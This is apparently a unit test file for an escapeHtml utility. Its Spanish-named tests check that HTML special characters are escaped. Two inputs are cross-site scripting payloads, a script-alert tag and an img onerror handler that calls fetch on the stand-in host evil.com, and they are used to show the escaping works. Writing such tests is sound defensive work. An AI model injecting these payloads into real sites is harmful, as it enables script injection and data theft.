import { escapeHtml } from '@/lib/utils'

describe('escapeHtml', () => {
  it('escapa etiquetas de script', () => {
    expect(escapeHtml('<script>alert("xss")</script>')).toBe(
      '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
    )
  })

  it('escapa inyección de imagen con onerror', () => {
    expect(escapeHtml('<img src=x onerror="fetch(\'evil.com\')">')).toBe(
      '&lt;img src=x onerror=&quot;fetch(\'evil.com\')&quot;&gt;'
    )
  })

  it('escapa ampersands', () => {
    expect(escapeHtml('precio & condiciones')).toBe('precio &amp; condiciones')
  })

  it('escapa comillas dobles', () => {
    expect(escapeHtml('attr="valor"')).toBe('attr=&quot;valor&quot;')
  })

  it('no modifica texto plano sin caracteres especiales', () => {
    const texto = 'Falta el número de parte en los ítems 2 y 3'
    expect(escapeHtml(texto)).toBe(texto)
  })

  it('escapa todos los caracteres especiales juntos', () => {
    expect(escapeHtml('<b>título</b> & "valor"')).toBe(
      '&lt;b&gt;título&lt;/b&gt; &amp; &quot;valor&quot;'
    )
  })
})
